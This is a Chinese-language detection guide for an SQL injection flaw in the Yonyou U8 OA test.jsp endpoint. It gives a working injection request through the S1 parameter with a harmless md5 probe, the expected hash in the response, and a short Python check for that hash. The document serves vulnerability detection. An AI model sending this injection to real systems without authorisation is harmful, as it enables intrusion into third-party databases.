# 用友 U8 OA SQL注入漏洞（yonyou-u8-oa-sqli）检测说明

## 漏洞简介

用友 U8 OA 存在SQL注入漏洞，攻击者可通过特定参数注入恶意SQL语句，进而获取数据库敏感信息、篡改数据，甚至以管理员权限执行未授权操作。

## 影响范围

- 产品：用友 U8 OA
- CVE编号：无（社区编号 yonyou-u8-oa-sqli）
- 危害等级：Critical

## 漏洞原理

/yyoa/common/js/menu/test.jsp接口的S1参数未做有效过滤，攻击者可注入SQL语句，利用数据库的md5函数回显特征数据。

## 利用方式与攻击流程

1. 攻击者构造带有SQL注入payload的GET请求，S1参数注入`(SELECT md5(999999999))`。
2. 服务器端未对参数进行安全处理，直接拼接执行SQL。
3. 数据库执行恶意SQL，返回包含md5(999999999)的特征数据。
4. 攻击者分析响应内容，确认漏洞存在。

## 探测原理与流程

### 探测请求的构造

```http
GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(999999999)) HTTP/1.1
Host: target.com
```

- S1参数注入了`(SELECT md5(999999999))`，用于判断是否存在注入点。

### 预期响应与交互

- 响应体需包含`ef775988943825d2871e1cfa75473ec0`（即md5(999999999)的值），表明SQL语句被执行。
- HTTP状态码为200。

### 判定逻辑

```python
def is_vulnerable(response):
    if 'ef775988943825d2871e1cfa75473ec0' in response.text and response.status_code == 200:
        return True
    return False
```

### 检测流程Mermaid图

```mermaid
graph TD
    A[发送带注入payload的GET请求] --> B[接收HTTP响应]
    B --> C{响应体含md5(999999999)?}
    C -- 否 --> F[非漏洞]
    C -- 是 --> D{状态码为200?}
    D -- 否 --> F
    D -- 是 --> G[判定存在SQL注入漏洞]
```

## 参考链接

- [PeiQi文库-用友U8 OA test.jsp SQL注入漏洞](http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)
- [Tencent Cloud - 用友OA SQL注入](https://www.tencentcloud.com/document/product/627/38435) 